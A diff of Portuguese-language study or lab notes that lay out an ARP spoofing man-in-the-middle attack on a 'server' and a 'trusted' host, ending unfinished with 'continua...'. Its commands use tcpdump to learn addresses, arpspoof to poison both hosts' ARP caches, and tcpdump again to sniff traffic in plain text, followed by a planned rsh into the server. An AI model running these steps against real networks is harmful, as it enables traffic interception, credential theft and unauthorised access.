@@ -1,5 +1,37 @@
-trusted_host: se comunicar com target via rsh
-atacker: usar tcpdump pra monitorar o trafego entre target e trusted_host
-atacker: dar deny em trusted_host
-atacker: spoofar proprio mac
-atacker: fazer rsh pra target
+atacker: para oberter enderecos do server e trusted, vamos usar tcpdump pra monitorar o trafego entre server e trusted
+tcpdump -x -i eth0 arp
+
+
+como as entradas da cache arp expiram após alguns minutos, realizar uma comunicação via ip eventualmente irá resultar em um arp request
+e como estamos monitorando a rede poderemos saber o ip de quem fez o request, seu mac e o ip de quem ele quer saber o mac
+
+trusted: pingar server pra causar um arp request
+ping server
+
+server: pingar trusted para causar um arp request
+ping trusted
+
+
+attacker: agora que sabemos os macs e ips de quem está na nossa rede, vamos adicioná-los a nossa propria cache
+arp -s [ip de trusted] [mac de trusted]
+arp -s [ip de server] [mac de server]
+
+attacker: agora somos capazes de evenenar as tabelas de cada uma dessas máquinas para implementarmos o ataque man-in-the-middle
+para isso vamos envenenar os dois lados da conexao
+arpspoof -i eth0 -t trusted server > /dev/null 2>&1 &
+arpspoof -i eth0 -t server trusted > /dev/null 2>&1 &
+
+com isso toda a comunicação que deveria ocorrer entre server e trusted passará também por attacker
+
+
+attacker: agora começamos a monitorar os pacotes que passam de um lado para o outro, dessa vez vamos analisar os pacotes como ascii para
+ver se alguma informação interessante trafega
+
+tcpdump -A -i eth0 host [ip de trusted]
+
+atacker: fazer rsh pra server
+
+continua...
+
+# arp entry max age
+/proc/sys/net/ipv4/neigh/ethX/gc_stale_time
